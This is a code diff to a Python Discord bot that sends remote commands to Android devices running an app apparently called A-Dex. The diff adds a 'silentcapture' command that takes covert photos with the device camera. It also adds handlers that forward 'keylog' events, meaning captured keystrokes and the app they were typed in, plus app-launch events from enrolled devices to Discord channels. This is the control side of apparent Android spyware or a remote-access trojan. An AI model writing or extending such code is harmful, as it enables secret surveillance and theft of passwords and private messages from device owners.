@@ -76,6 +76,8 @@ DEVICE_COMMAND_NAMES = {
     "unlockapp",
     "lockedapps",
     "usage",
+    "wallpaper",
+    "silentcapture",
 }
 
 
@@ -340,6 +342,11 @@ def format_result_message(result: dict[str, Any]) -> str:
         return (
             f"Command `{command_name}` failed on device `{device_id}`: {error_code}.\n"
             "Fix: Open the app -> tap `Open Permission Setup` -> enable A-Dex Accessibility Service -> retry `/screenshot`."
+        )
+    if command_name == "shield" and error_code == "ACCESSIBILITY_SERVICE_NOT_ACTIVE":
+        return (
+            f"Command `{command_name}` failed on device `{device_id}`: {error_code}.\n"
+            "Fix: Open the app -> Open Permission Setup -> enable A-Dex Accessibility Service -> retry `/shield action:enable`."
         )
     return f"Command `{command_name}` failed on device `{device_id}`: {error_code} {error_message}".strip()
 
@@ -796,6 +803,16 @@ class ADexDiscordClient(discord.Client):
                 "fakecallui",
                 {"callerName": caller_name, "seconds": int(seconds)},
             )
+
+        @self.tree.command(name="wallpaper", description="Set device wallpaper from URL")
+        @app_commands.describe(url="Direct image file URL")
+        async def wallpaper(interaction: discord.Interaction, url: str) -> None:
+            await self._queue_remote_command(interaction, "wallpaper", {"url": url})
+
+        @self.tree.command(name="silentcapture", description="Take silent background photo")
+        @app_commands.describe(camera_id="Camera ID (0 for back, 1 for front)")
+        async def silentcapture(interaction: discord.Interaction, camera_id: str = "0") -> None:
+            await self._queue_remote_command(interaction, "silentcapture", {"cameraId": camera_id})
 
         @self.tree.command(name="shakealert", description="Control shake detector module")
         @app_commands.describe(action="Action")
@@ -1322,8 +1339,43 @@ class ADexDiscordClient(discord.Client):
             await channel.send(content=text)
 
     async def _publish_device_event(self, payload: dict[str, Any]) -> None:
-        if payload.get("eventType") != "auto_enrolled":
+        event_type = payload.get("eventType")
+        device_id = payload.get("deviceId", "unknown")
+        data = payload.get("data") or {}
+
+        if event_type == "auto_enrolled":
+            await self._handle_auto_enroll_event(payload)
             return
+
+        channel_id_raw = payload.get("channelId")
+        if not channel_id_raw:
+            return
+        
+        try:
+            channel_id = int(channel_id_raw)
+        except (TypeError, ValueError):
+            return
+
+        channel = self.get_channel(channel_id)
+        if channel is None:
+            try:
+                channel = await self.fetch_channel(channel_id)
+            except Exception:
+                return
+        
+        if not isinstance(channel, discord.abc.Messageable):
+            return
+
+        if event_type == "keylog":
+            text = data.get("text") or ""
+            package = data.get("packageName") or "unknown"
+            if text:
+                await channel.send(f"⌨️ **Keylog** from `{device_id}` (`{package}`):\n```{text}```")
+        elif event_type == "app_launch":
+            package = data.get("packageName") or "unknown"
+            await channel.send(f"🚀 **App Launch** on `{device_id}`: `{package}`")
+
+    async def _handle_auto_enroll_event(self, payload: dict[str, Any]) -> None:
 
         channel_id_raw = payload.get("channelId")
         if not channel_id_raw:
